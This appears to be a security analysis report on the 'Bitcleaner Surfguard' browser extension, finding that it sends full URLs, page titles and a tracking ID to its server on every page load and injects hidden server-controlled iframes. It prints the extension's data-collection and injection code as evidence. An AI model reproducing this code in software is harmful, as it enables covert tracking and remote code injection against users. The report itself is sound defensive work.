# Vulnerability Report: Bitcleaner Surfguard

## Metadata
- **Extension ID**: aeefnonlfngaeblgiipagcfmcakbmmjk
- **Extension Name**: Bitcleaner Surfguard
- **Version**: 1.0.0
- **Users**: Unknown
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-15

## Executive Summary

Bitcleaner Surfguard presents itself as a domain safety rating tool that allows users to view and submit safety ratings for websites. However, the extension engages in undisclosed tracking and code injection practices that raise significant privacy concerns. The extension collects extensive browsing data (including URLs, titles, tab IDs, and domain information) and transmits this to bitcleaner-surfguard.com without adequate user disclosure. Most concerning is the hidden injection of invisible tracking iframes into web pages based on server instructions, which represents covert code injection beyond the extension's stated purpose.

While the extension does provide the advertised domain rating functionality, the undisclosed data collection and hidden iframe injection constitute deceptive practices that violate user trust and privacy expectations.

## Vulnerability Details

### 1. HIGH: Undisclosed Browsing Data Exfiltration

**Severity**: HIGH
**Files**: bg.js (lines 188-211, 296-311, 315-334)
**CWE**: CWE-359 (Exposure of Private Information)

**Description**: The extension collects and transmits detailed browsing data to bitcleaner-surfguard.com for every website the user visits, including tab URLs, page titles, tab IDs, and domain information. This data collection occurs automatically on every page load and tab switch, without explicit user consent or adequate disclosure.

**Evidence**:
```javascript
// Function makeratingsurveillance - builds data packet with browsing info
function makeratingsurveillance(doquickLoop) {
      var critiquecritiquerating = {
            version: checkVarshield,
            tabId: doquickLoop.id,
            title: doquickLoop.title,      // Page title
            domain: makebaseVal,
            url: doquickLoop.url,           // Full URL
            sovish: lowcritique,           // User tracking ID
            action: 'getScore',
            active: doquickLoop.active,
            name: votecritiqueassess
      };
      // Transmitted to server via POST
      makeratingdecisionassess = performsafetyQuickBase(critiquecritiquerating);
      return makeratingdecisionassess;
}

// Triggered on every tab update
chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
      if (changeInfo.status == 'loading') {
            makelowdefence(tab);  // Calls makeratingsurveillance
      }
});
```

**Verdict**: This constitutes undisclosed tracking of user browsing activity. While the extension needs some domain information to provide ratings, collecting full URLs, page titles, and tab IDs goes beyond what's necessary and represents excessive data collection without adequate user disclosure.

### 2. HIGH: Hidden Iframe Injection for Tracking

**Severity**: HIGH
**Files**: bg.js (lines 20-36, 269-276)
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**: The extension injects invisible iframes into web pages based on server instructions received in API responses. This iframe injection is completely hidden from the user (display: none) and executes code from a server-controlled URL, enabling covert tracking or malicious code execution.

**Evidence**:
```javascript
// Creates hidden iframe with server-provided URL
function makebubblesafety(executeprocSys) {
      var checkExecdecision = Math.random() + 'checkExecdecision';
      var protectionQuick = document.createElement('iframe');
      protectionQuick.id = checkExecdecision;
      protectionQuick.src = executeprocSys;  // Server-controlled URL
      protectionQuick.style.display = 'none';  // HIDDEN from user

      var execBase = document.getElementsByTagName('body')[0];
      execBase.appendChild(protectionQuick);

      setTimeout(function () {
            document.getElementById(checkExecdecision).remove();
            getGetsoundness = false;
      }, 20 * 1000);  // Stays active for 20 seconds
}

// Server response triggers iframe injection
function executebubblesurveillance(executelinesafety) {
      // ... other code ...
      if (executelinesafety.surf) {
            chrome.scripting.executeScript({
                  target: {tabId: parseInt(executelinesafety.tabId)},
                  func: makebubblesafety,
                  args: [executelinesafety.surf],  // URL from server
            }, (loop) => {});
      }
}
```

**Verdict**: This is a serious privacy violation. The extension injects hidden tracking iframes into web pages based on server instructions, with the iframe URL controlled remotely. The iframes are invisible to users and remain active for 20 seconds, allowing the third-party domain to track users across sites without any disclosure. This goes far beyond the stated purpose of providing domain safety ratings.

### 3. MEDIUM: Remote Configuration and Dynamic Behavior

**Severity**: MEDIUM
**Files**: bg.js (lines 6-7, 40-72, 145-146, 163-165)
**CWE**: CWE-494 (Download of Code Without Integrity Check)

**Description**: The extension's behavior is dynamically controlled by remote servers through API responses. Server responses can trigger various actions including iframe injection, icon changes, and data storage modifications.

**Evidence**:
```javascript
// Remote endpoints
var safetySysProc = 'https://bitcleaner-surfguard.com/dih?sovish=bitcleaner_surfguard&version=1.0.0';
var voteHighMain = 'https://bitcleaner-surfguard.com/roh';

// Generic fetch function processes server commands
function makegetcritique(dosoundnesscritique, executefunExec, makevotecritique, executeguardsurveillance) {
      fetch(getFunsoundness)
      .then(loop => {
            return loop.text();
      })
      .then(baseLoop => {
            var checkdefenceFun = baseLoop;
            try {
                  var checkdefenceFun = JSON.parse(checkdefenceFun);
            }
            catch (decisionLoop) {
            }
            executeguardsurveillance(checkdefenceFun);  // Callback processes response
      })
}
```

**Verdict**: While remote configuration is common, the combination with undisclosed tracking and hidden iframe injection makes this concerning. The server has significant control over extension behavior, including the ability to inject arbitrary iframe URLs.

## False Positives Analysis

The following patterns are legitimate for this extension type:
- **Domain extraction and processing**: Required to provide domain-specific ratings
- **Storage of user ratings**: Necessary to remember which sites the user has rated
- **Tab event listeners**: Required to update the icon based on current domain
- **Fetch requests to rating server**: Expected for a crowd-sourced rating system

However, the excessive data collection, full URL transmission, and hidden iframe injection are NOT legitimate for a simple domain rating tool.

## API Endpoints Analysis

| Endpoint | Purpose | Data Sent | Risk |
|----------|---------|-----------|------|
| bitcleaner-surfguard.com/dih | Initial ID assignment | Extension name, version | LOW - Appears to be installation tracking |
| bitcleaner-surfguard.com/roh | Get domain ratings, submit user ratings | Full URL, page title, tab ID, domain, user ID, action type | HIGH - Excessive browsing data collection |

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Justification**:
Bitcleaner Surfguard engages in deceptive privacy practices that go far beyond its stated purpose of providing domain safety ratings. The extension collects extensive browsing data (full URLs, page titles, tab IDs) and transmits it to a remote server on every page load without adequate disclosure. Most critically, it injects hidden tracking iframes into web pages based on server commands, enabling covert third-party tracking across websites.

While the extension does provide the advertised domain rating functionality, the undisclosed data collection and hidden code injection represent significant privacy violations. Users installing this extension for simple domain ratings would not reasonably expect their complete browsing history to be tracked or invisible tracking iframes to be injected into websites they visit.

The combination of:
1. Undisclosed collection of full browsing URLs and page titles
2. Hidden iframe injection controlled by remote server
3. Persistent user tracking via unique IDs
4. Broad <all_urls> permissions enabling sitewide injection

constitutes a HIGH privacy risk. The extension's behavior is deceptive and violates user trust, even if not technically malicious in nature.

**Recommendation**: Users should avoid this extension. The privacy risks significantly outweigh the utility of crowd-sourced domain ratings, especially given the undisclosed nature of the tracking.
